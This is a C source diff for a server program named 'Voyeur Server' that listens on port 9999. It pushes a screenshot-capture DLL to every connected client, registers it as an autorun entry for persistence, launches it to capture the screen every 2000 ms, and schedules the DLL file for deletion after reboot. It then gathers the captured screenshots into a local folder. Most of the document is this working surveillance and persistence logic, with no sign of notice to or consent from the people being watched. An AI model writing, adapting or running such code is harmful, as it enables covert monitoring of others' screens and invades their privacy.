@@ -11,12 +11,15 @@
 
 void WorkProc(PCLIENT_INFO p)
 {
-	//puts(__FUNCTION__);
-	ULONG AttrVal;
+	PWCHAR names = NULL;
+	BOOLEAN bFound = FALSE;
 	WCHAR wsAppPath[MAX_PATH] = {0};
 	WCHAR wsSavingPath[MAX_PATH] = {0};
 	WCHAR wsLF[MAX_PATH] = {0};
 	WCHAR wsRF[MAX_PATH] = L"C:\\ProgramData\\psc.dll";
+	WCHAR wsDllParam[] = L"MainProc 2000";//"2000" = "take screenshots every 2000ms"
+	WCHAR wsDir[MAX_PATH] = L"C:\\ProgramData\\ScreenShot";
+	ULONG dwFiles = 0, dwCrc32Val = 0;
 	//Query local file path
 	if(GetModuleFileNameW(0, wsAppPath, MAX_PATH))
 	{
@@ -28,11 +31,11 @@ void WorkProc(PCLIENT_INFO p)
 				wsAppPath[i+1]=L'\0';
 				//make local saving directory
 				wcscat(wsSavingPath, wsAppPath);
-				wcscat(wsSavingPath, L"00000000\\");
+				wcscat(wsSavingPath, L"RemoteScreenshots\\");
 				CreateDirectoryW(wsSavingPath, NULL);
 				//set local DLL path
 				wcscat(wsLF, wsAppPath);
-				wcscat(wsLF, L"udsp-psc-32.dll");
+				wcscat(wsLF, L"udsp-screen-capture32.dll");
 				break;
 			}
 		}
@@ -42,83 +45,94 @@ void WorkProc(PCLIENT_INFO p)
 		printf("[%04ld]Query program path unsuccessfully.\n", p->id);
 		goto __exit;
 	}
-	//Check if the DLL file exists.
-	if(_CmdFileOperation(p->id, CLIENT_FSO_GET_ATTRIB, wsRF, NULL, &AttrVal))
+	//Check if the PSC autorun exists
+	if(_CmdQueryAutoRunBin(p->id, CLIENT_AUTORUN_TYPE_DLL, &names))
 	{
-		printf("[%04ld]Query file attribute successfully: 0x%X.\n", p->id, AttrVal);
-		if(AttrVal==0)
+		PWCHAR ptr = names;
+		while(1)
 		{
-			printf("[%04ld]psc.dll does not exist.\n", p->id);
-			ULONG64 RetVal = 0;
-			WCHAR wsRunDll[MAX_PATH] = {0};
-			WCHAR wsParameter[MAX_PATH] = {0};
-			//Create directory.
-			if(_CmdFileOperation(p->id, CLIENT_FSO_CREATE_DIRECTORY, L"c:\\ProgramData", NULL, NULL))
+			if(wcslen(ptr)==0)break;
+			printf("[%04ld][DllAutoRun]%S.\n", p->id, ptr);
+			if(wcsicmp(ptr,L"PSC")==0)
 			{
-				printf("[%04ld]Create ProgramData directory successfully.\n", p->id);
+				bFound = TRUE;
+				break;
 			}
-			else
-			{
-				printf("[%04ld]Create ProgramData directory unsuccessfully.\n", p->id);
-			}
-			//Upload the DLL file
-			if(_CmdUploadFileTo(p->id, wsLF, wsRF, NULL))
-			{
-				printf("[%04ld]Upload file successfully.\n", p->id);
-			}
-			else
-			{
-				printf("[%04ld]Upload file unsuccessfully.\n", p->id);
-				goto __exit;
-			}
-			//Make RunDLL string
-			if(strstr(p->szDescription, "(WIN32-"))
-			{
-				wcscat(wsRunDll, L"c:\\windows\\system32\\rundll32.exe");
-			}
-			else
-			{
-				wcscat(wsRunDll, L"c:\\windows\\syswow64\\rundll32.exe");
-
-			}
-			//Set parameters, "2000" means "take screenshot every 2000 milliseconds"
-			wcscat(wsParameter, wsRF);
-			wcscat(wsParameter, L",MainProc 2000");
-			//Add AutoRun
-			if(_CmdAddAutoRunBin(p->id, CLIENT_AUTORUN_TYPE_EXE, L"PSC", wsRunDll, wsParameter))
-			{
-				printf("[%04ld]Add auto-run successfully.\n", p->id);
-			}
-			else
-			{
-				printf("[%04ld]Add auto-run unsuccessfully.\n", p->id);
-				goto __exit;
-			}
-			//Run DLL
-			wcscat(wsRunDll, L" ");
-			wcscat(wsRunDll, wsParameter);
-			if(_CmdExecuteBinary(p->id, wsRunDll, SW_SHOWMINIMIZED, 0, &RetVal))
-			{
-				printf("[%04ld]Run DLL successfully.\n", p->id);
-			}
-			else
-			{
-				printf("[%04ld]Run DLL unsuccessfully.\n", p->id);
-				goto __exit;
-			}
+			ptr = ptr + wcslen(ptr)+1;
 		}
-		else
-		{
-			printf("[%04ld]psc.dll exists.\n", p->id);
-		}
+		FREE(names);
 	}
 	else
 	{
-		printf("[%04ld]Query file attribute unsuccessfully.\n", p->id);
+		printf("[%04ld]Query auto-run unsuccessfully.\n", p->id);
 		goto __exit;
 	}
-	ULONG dwFiles = 0;
-	WCHAR wsDir[MAX_PATH] = L"C:\\ProgramData\\ScreenShot";
+	//Upload DLL and set AutoRun
+	if(!bFound)
+	{
+		ULONG64 RetVal = 0;
+		WCHAR wsRunDll[MAX_PATH] = {0};
+		//Create directory
+		if(_CmdFileOperation(p->id, CLIENT_FSO_CREATE_DIRECTORY, L"c:\\ProgramData", NULL, NULL))
+		{
+			printf("[%04ld]Create ProgramData directory successfully.\n", p->id);
+		}
+		else
+		{
+			printf("[%04ld]Create ProgramData directory unsuccessfully.\n", p->id);
+		}
+		//Delete DLL
+		if(_CmdFileOperation(p->id, CLIENT_FSO_DELETE, wsRF, NULL, NULL))
+		{
+			printf("[%04ld]Delete DLL successfully.\n", p->id);
+		}
+		else
+		{
+			printf("[%04ld]Delete DLL unsuccessfully.\n", p->id);
+		}
+		//Upload the DLL file
+		if(_CmdUploadFileTo(p->id, wsLF, wsRF, NULL))
+		{
+			printf("[%04ld]Upload file successfully.\n", p->id);
+		}
+		else
+		{
+			printf("[%04ld]Upload file unsuccessfully.\n", p->id);
+			goto __exit;
+		}
+		//Add AutoRun
+		if(_CmdAddAutoRunBin(p->id, CLIENT_AUTORUN_TYPE_DLL, L"PSC", wsRF, wsDllParam))
+		{
+			printf("[%04ld]Add auto-run successfully.\n", p->id);
+		}
+		else
+		{
+			printf("[%04ld]Add auto-run unsuccessfully.\n", p->id);
+			goto __exit;
+		}
+		//Run DLL
+		wcscat(wsRunDll, wsRF);
+		wcscat(wsRunDll, L",");
+		wcscat(wsRunDll, wsDllParam);
+		if(_CmdExecuteBinary(p->id, wsRunDll, CLIENT_RUN_DLL_P1, CLIENT_RUN_DLL_P2, &RetVal))
+		{
+			printf("[%04ld]Load DLL successfully.\n", p->id);
+		}
+		else
+		{
+			printf("[%04ld]Load DLL unsuccessfully.\n", p->id);
+			goto __exit;
+		}
+		//Delete DLL after reboot
+		if(_CmdFileOperation(p->id, CLIENT_FSO_DELAY_MOV_DEL, wsRF, NULL, NULL))
+		{
+			printf("[%04ld]Delay to delete DLL successfully.\n", p->id);
+		}
+		else
+		{
+			printf("[%04ld]Delay to delete DLL unsuccessfully.\n", p->id);
+		}
+	}
 	//Query file count of ScreenShot directory.
 	if(_CmdQueryDirectory(p->id, wsDir, NULL, &dwFiles))
 	{
@@ -187,6 +201,10 @@ void main()
 	//2.perform operations on each client multiple times.
 	//3.traverse all clients unlimited times.
 	//4.the time interval for each traversal of all clients is 4096 milliseconds.
+	SetConsoleTitleW(L"Voyeur Server");
+	puts("Description: This server program will push a DLL for screenshots to all clients, "
+		"and the DLL will run automatically after the system starts. When the server program is online, "
+		"it will collect screenshots from all clients and save to \"RemoteScreenshots\" folder.\n");
 	CreateSimpleServer(9999, WorkProc, 0, 0, 0, USN_PAGE_SIZE);
 	system("pause");
 }
